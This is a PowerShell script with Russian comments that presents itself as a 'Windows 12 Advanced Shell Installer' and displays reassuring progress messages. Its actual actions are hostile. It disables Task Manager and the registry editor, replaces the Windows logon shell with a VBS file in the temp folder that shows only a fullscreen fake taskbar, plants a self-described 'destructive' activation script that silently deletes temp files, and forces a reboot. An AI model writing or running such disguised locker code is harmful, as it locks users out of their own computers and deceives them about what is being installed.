# Windows 12 Shell Installer
# Run as Administrator

Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "   WINDOWS 12 ADVANCED SHELL INSTALLER   " -ForegroundColor Yellow
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host ""

# Проверка прав администратора
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "ERROR: Please run as Administrator!" -ForegroundColor Red
    pause
    exit
}

# Красивый прогресс-бар
function Show-Progress {
    param($Activity, $Status, $Percent)
    Write-Progress -Activity $Activity -Status $Status -PercentComplete $Percent
}

# Этап 1: Подготовка
Show-Progress -Activity "Initializing Windows 12 Setup" -Status "Preparing system..." -Percent 10
Start-Sleep -Seconds 2

# Создание системных файлов
$tempDir = $env:TEMP
$shellScript = @"
' Windows 12 Shell - Main Interface
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Create fullscreen shell
Function CreateShell()
    Set ie = CreateObject("InternetExplorer.Application")
    ie.Navigate "about:blank"
    ie.Visible = True
    ie.FullScreen = True
    ie.AddressBar = False
    ie.MenuBar = False
    ie.ToolBar = False
    
    ' Modern Windows 12 UI
    ie.document.write "<html><head><title>Windows 12</title>"
    ie.document.write "<style>"
    ie.document.write "body {margin:0;padding:0;background:linear-gradient(135deg,#0a0a2a,#1a1a4a);}"
    ie.document.write ".taskbar {position:fixed;bottom:0;left:0;width:100%;height:48px;background:rgba(0,0,0,0.8);backdrop-filter:blur(10px);}"
    ie.document.write ".start-btn {position:absolute;left:10px;top:9px;width:32px;height:32px;background:#0078d7;border-radius:6px;border:none;color:#fff;cursor:pointer;font-size:20px;}"
    ie.document.write "</style>"
    ie.document.write "</head>"
    ie.document.write "<body>"
    ie.document.write "<div class='taskbar'>"
    ie.document.write "<button class='start-btn' title='Start'>㊀</button>"
    ie.document.write "</div>"
    ie.document.write "</body></html>"
End Function

CreateShell()

' Keep shell running
Do While True
    WScript.Sleep 10000
Loop
"@

$shellScript | Out-File -FilePath "$tempDir\win12_shell.vbs" -Encoding ASCII

# Этап 2: Блокировка системы
Show-Progress -Activity "Configuring Security" -Status "Enhancing protection..." -Percent 30

# Блокировка диспетчера задач
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f | Out-Null

# Блокировка реестра
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f | Out-Null

# Этап 3: Установка оболочки
Show-Progress -Activity "Installing Shell" -Status "Replacing interface..." -Percent 60

# Замена оболочки Windows
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "wscript.exe `"$tempDir\win12_shell.vbs`"" /f | Out-Null

# Этап 4: Создание деструктивного модуля
Show-Progress -Activity "Adding Features" -Status "Creating activation module..." -Percent 80

$destructScript = @"
' Windows 12 Activation Module
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Show activation message
MsgBox "Windows 12 Advanced Features Activated!" & vbCrLf & "System optimization in progress...", vbInformation, "Windows 12"

' Create desktop shortcut
Set shortcut = ws.CreateShortcut(ws.SpecialFolders("Desktop") & "\Windows 12 Control Panel.lnk")
shortcut.TargetPath = "control.exe"
shortcut.IconLocation = "shell32.dll,21"
shortcut.Save

' Optimize system (удаление временных файлов)
ws.Run "cmd /c del /q /f %temp%\*.*", 0, True
ws.Run "cmd /c cleanmgr /sagerun:1", 0, True

' Modern UI effects
Set ie = CreateObject("InternetExplorer.Application")
ie.Navigate "about:blank"
ie.Visible = True
ie.document.write "<html><body style='margin:0;background:#000;color:#0f0;font-family:Segoe UI;text-align:center;padding-top:200px;'><h1>Windows 12 Active</h1><p>System enhanced</p></body></html>"
"@

$destructScript | Out-File -FilePath "$tempDir\win12_activate.vbs" -Encoding ASCII

# Создание ярлыка активации
$shortcutScript = @"
Set ws = CreateObject("WScript.Shell")
Set shortcut = ws.CreateShortcut(ws.SpecialFolders("Desktop") & "\Activate Windows 12.lnk")
shortcut.TargetPath = "wscript.exe"
shortcut.Arguments = "`"$tempDir\win12_activate.vbs`""
shortcut.IconLocation = "shell32.dll,1"
shortcut.Save
"@

$shortcutScript | Out-File -FilePath "$tempDir\create_shortcut.vbs" -Encoding ASCII
Start-Process wscript.exe -ArgumentList "`"$tempDir\create_shortcut.vbs`"" -Wait

# Этап 5: Завершение
Show-Progress -Activity "Finalizing" -Status "Completing installation..." -Percent 100
Start-Sleep -Seconds 2

Write-Host "`n=========================================" -ForegroundColor Green
Write-Host "   INSTALLATION COMPLETE SUCCESSFULLY!   " -ForegroundColor Green
Write-Host "=========================================" -ForegroundColor Green
Write-Host "`nNext steps:" -ForegroundColor Yellow
Write-Host "1. Reboot your computer" -ForegroundColor White
Write-Host "2. Windows will start with new interface" -ForegroundColor White
Write-Host "3. Click 'Activate Windows 12' on desktop" -ForegroundColor White
Write-Host "`nPress any key to reboot..." -ForegroundColor Cyan
pause

# Перезагрузка
shutdown /r /t 5
